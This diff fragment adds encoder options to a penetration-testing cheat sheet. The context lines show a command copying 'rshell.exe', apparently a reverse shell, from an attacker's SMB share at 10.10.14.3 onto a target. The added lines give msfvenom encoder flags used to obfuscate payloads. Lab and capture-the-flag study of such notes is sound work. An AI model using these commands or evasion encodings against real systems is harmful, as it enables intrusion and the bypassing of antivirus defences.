@@ -878,6 +878,12 @@ PS> xcopy \\10.10.14.3\files\rshell.exe .   # @TARGET: Copy rshell.exe from remo
 Msfvenom commands:
 * https://netsec.ws/?p=331
 
+Encoders:
+```bash
+$ [msfvenom commands] -e x86/shikata_ga_nai
+$ [msfvenom commands] -e x86/alpha_mixed
+``
+
 # COMPILING EXPLOIT CODE
 
 Compilation tips:
